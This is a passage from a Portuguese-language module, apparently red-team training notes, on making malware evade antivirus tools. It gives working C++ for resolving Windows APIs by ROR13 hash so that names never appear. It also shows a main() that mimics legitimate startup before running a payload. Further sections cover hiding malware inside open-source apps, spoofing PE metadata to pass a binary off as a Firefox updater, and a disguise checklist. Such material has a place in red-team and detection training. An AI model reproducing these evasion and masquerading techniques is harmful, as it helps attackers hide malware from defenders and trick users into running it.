**Vantagem**: `VirtualAlloc`, `CreateRemoteThread` etc. não aparecem na IAT — apenas `LoadLibrary` e `GetProcAddress`, que são esperadas em qualquer executável legítimo.

---

### API Checksum / API Hashing

**Limitação do método anterior**: `GetProcAddress` ainda precisa de um nome (mesmo que decriptado em runtime). Um hook em `GetProcAddress` captura o nome.

**Solução**: Implementar `GetProcAddress` customizado que aceita **hash** em vez de nome — nunca o nome em plaintext.

**Como funciona:**
1. Percorrer manualmente a Export Table da DLL via estruturas PE
2. Para cada nome exportado, calcular checksum/hash
3. Comparar com o hash alvo
4. Retornar o endereço quando hash coincidir

```cpp
// Hash simples (ROR13 — clássico em shellcode)
DWORD ror13_hash(const char* name) {
    DWORD hash = 0;
    while (*name) {
        hash = (hash >> 13) | (hash << 19);  // ROR 13
        hash += (DWORD)*name;
        name++;
    }
    return hash;
}

// GetProcAddress customizado por hash
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
    
    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + export_rva);
    
    DWORD* names = (DWORD*)((BYTE*)hModule + exports->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exports->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)hModule + exports->AddressOfFunctions);
    
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hModule + names[i]);
        if (ror13_hash(name) == target_hash) {
            return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
        }
    }
    return NULL;
}

// Uso — hash pré-calculado em compilação
#define HASH_VIRTUALALLOC  0xE553A458  // ror13("VirtualAlloc")
#define HASH_CREATETHREAD  0x835E515E  // ror13("CreateThread")

HMODULE kernel32 = GetModuleHandle("kernel32.dll");
auto pVirtualAlloc = (VirtualAllocDef)GetProcAddressByHash(kernel32, HASH_VIRTUALALLOC);
```

**Vantagem sobre nomes encriptados**: Mesmo com hook em `GetProcAddress` real, o nome nunca aparece — apenas integers (hashes) transitam no código.

---

### Blending In / Mascaramento de Contexto

**Problema**: Mesmo com APIs ofuscadas e strings encriptadas, um binário que abre imediatamente uma conexão de rede ou injeta em outro processo parece suspeito para análise comportamental.

**Princípio**: O malware deve parecer um programa legítimo — tanto estaticamente (metadados, imports) quanto dinamicamente (comportamento de execução).

#### Comportamento Inicial Legítimo

Inicializar subsistemas que programas legítimos usam antes de qualquer ação maliciosa:

```cpp
int main() {
    // Comportamento legítimo primeiro
    // DirectX initialization (parece game/app multimedia)
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    // OpenGL / sound library init
    // SDL_Init(SDL_INIT_VIDEO | SDL_INIT_AUDIO);
    
    // Pequena pausa "natural" (não sleep fixo — comportamento de app real)
    Sleep(rand() % 2000 + 500);
    
    // AGORA: lógica maliciosa
    execute_payload();
    
    return 0;
}
```

#### Embedding em Aplicativo Legítimo

Estratégia mais robusta: pegar código-fonte open-source de app real (calculadora, editor de texto, ferramenta de sistema), adicionar a carga maliciosa, compilar junto.

- App real fornece imports legítimos, comportamento real, janela real
- Malware roda em thread separada ou após inicialização do app
- Análise comportamental vê app funcionando normalmente

#### Metadados / Recursos do PE

Ferramentas como **Resource Hacker** permitem modificar:
- Version Info: FileDescription, ProductName, CompanyName, FileVersion
- Ícone: usar ícone real de app legítimo
- Manifest: solicitar privilégios de forma normal

```
Objetivo: fazer o binário "contar uma história coerente"
- Nome do arquivo: firefox_updater.exe (não payload.exe)
- Ícone: Firefox
- Version Info: Mozilla Corporation, 115.0.0
- Diretório: C:\Program Files\Mozilla Firefox\
- Imports: DLLs que Firefox usaria
```

**Verificar coerência da história:**
- O nome do arquivo combina com o ícone?
- A versão combina com o ano de compilação?
- Os imports fazem sentido para o tipo de app?
- O tamanho do binário é plausível para o tipo de app?

#### Checklist Blending In

```
[ ] Metadados do PE preenchidos com informação coerente
[ ] Ícone copiado de app legítimo (Resource Hacker)
[ ] Imports visíveis na IAT condizem com o tipo de app
[ ] Comportamento nos primeiros segundos parece legítimo
[ ] Nome/caminho de instalação plausível
[ ] Tamanho do arquivo razoável (binário muito pequeno + funcionalidade rede = suspeito)
[ ] Timestamp de compilação coerente com versão declarada
```

---

## Módulos Relacionados

`01_av_evasao_introducao.md` cobre os fundamentos de detecção AV, ThreatCheck e processo iterativo. `03_amsi_bypass.md` complementa custom loaders .NET com bypass específico de AMSI. `04_applocker_bypass.md` lida com o cenário onde o binário não pode ser executado diretamente. MITRE ATT&CK: T1027 (Obfuscated Files), T1055 (Process Injection), T1562.001 (Disable AV).

---

## Leitura Complementar

- Cobalt Strike Artifact Kit — https://www.cobaltstrike.com/product/features/artifact-kit
- Donut — https://github.com/TheWover/donut
- Freeze — https://github.com/optiv/Freeze
- DInvoke (alternativa ao P/Invoke pra .NET) — https://github.com/TheWover/DInvoke
- CRTO II — Payload Development + Defense Evasion
- OSEP (PEN-300) — Advanced Antivirus Evasion
